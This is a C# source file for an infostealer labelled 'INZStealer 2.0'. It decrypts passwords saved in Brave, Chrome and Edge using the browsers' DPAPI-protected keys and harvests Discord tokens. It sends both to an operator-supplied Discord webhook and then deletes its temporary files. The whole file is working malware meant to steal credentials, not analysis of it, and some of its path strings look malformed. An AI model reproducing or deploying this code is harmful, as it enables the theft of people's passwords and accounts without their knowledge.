using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography;
using System.Threading;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;
using Newtonsoft.Json;

namespace ConsoleApp1
{
    class Program
    {
        public static string Webhook_link = ""; //Webhook Link
        
        public static void Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetTempPath() + "INZ");

            string[] paths = {
               
                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Google\Chrome\User Data\default\Login Data",
                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Microsoft\Edge\User Data\Default\Login Data"

            };
            string pwd_text = "";

            foreach (string p in paths)
            {   
                var pas = Passwords.ReadPass(p);
                if (File.Exists(p))
                {
                    pwd_text += "INZStealer 2.0\r\n\r\n";
                    
                    foreach (var item in pas)
                    {
                        if ((item.Item2.Length > 0) && (item.Item2.Length > 0))
                        {
                            pwd_text += "URL: " + item.Item1 + "\r\n" + "Login: " + item.Item2 + "\r\n" + "Password: " + item.Item3 + "\r\n";
                            pwd_text += " \r\n";
                        }
                    }
                }
            }
            if (File.Exists(Path.GetTempPath() + @"INZ
            \Login Data"))
            {
                File.Delete(Path.GetTempPath() + @"INZ
             \Login Data");
            }

            string TempPath = Path.GetTempPath();
            File.WriteAllText(TempPath + "/INZ/Passwords.txt", pwd_text);



            string FilePath = TempPath + "/INZ/Passwords.txt";
            string[] lines;
            var list = new List<string>();
            var fileStream = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
            using (var streamReader = new StreamReader(fileStream, Encoding.UTF8))
            {
                string line;
                while ((line = streamReader.ReadLine()) != null)
                {
                    list.Add(line);
                }
            }
            lines = list.ToArray();
            //System.Diagnostics.Process.Start(FilePath); 

            var tokens = DiscordG.Program.GetThem();
            if (tokens != null)
            {
                if (tokens.Count > 0)
                {
                    DiscordG.Program.SendMeResults(tokens);

                }
            }
            DiscordG.Program.SendMeResults(list);



            // System.Diagnostics.Process.Start(FilePath); //UNCOMMENT ONLY IF YOU WANT THE PASSWORDS TO POP UP 
            Thread.Sleep(5000);
            Directory.Delete(TempPath + "/INZ/", true);

        }
        class Passwords
        {
            public static IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
            {
                if (File.Exists(Path.GetTempPath() + @"INZ\Login Data"))
                {
                    File.Delete(Path.GetTempPath() + @"INZ\Login Data");
                }
                byte[] key = AesGcm256.GetKey(dbPath);
                var connectionString = "Data Source=" + dbPath + ";pooling=false";
                using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
                using (var cmd = conn.CreateCommand())
                {


                    cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
                    
                    conn.Open();

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {

                            byte[] encryptedData = (byte[])reader[0];
                            byte[] nonce, ciphertextTag;
                            AesGcm256.prepare(encryptedData, out nonce, out ciphertextTag);
                            string value = AesGcm256.decrypt(ciphertextTag, key, nonce);



                            yield return Tuple.Create(reader.GetString(2), reader.GetString(1), value);



                        }

                    }
                    conn.Close();
                }
            }
        }
    }


}
class AesGcm256
{
    

    public static byte[] GetKey(string dbpath)
    {
        string path = "";
        if (dbpath.Contains("Brave-Browser"))
        {
            path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State";
        } else if (dbpath.Contains("Chrome"))
        {
            path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Local State";
        }
        else if (dbpath.Contains("Edge"))
        {
            path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Local State";
        }

        string v = File.ReadAllText(path);

        dynamic json = JsonConvert.DeserializeObject(v);
        string key = json.os_crypt.encrypted_key;

        byte[] src = Convert.FromBase64String(key);
        byte[] encryptedKey = src.Skip(5).ToArray();

        byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

        return decryptedKey;
    }

    public static string decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
    {
        string sR = String.Empty;
        try
        {
            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
            AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

            cipher.Init(false, parameters);
            byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
            Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
            cipher.DoFinal(plainBytes, retLen);

            sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            Console.WriteLine(ex.StackTrace);
        }

        return sR;
    }

    public static void prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
    {
        nonce = new byte[12];
        ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

        System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
        System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
    }
}



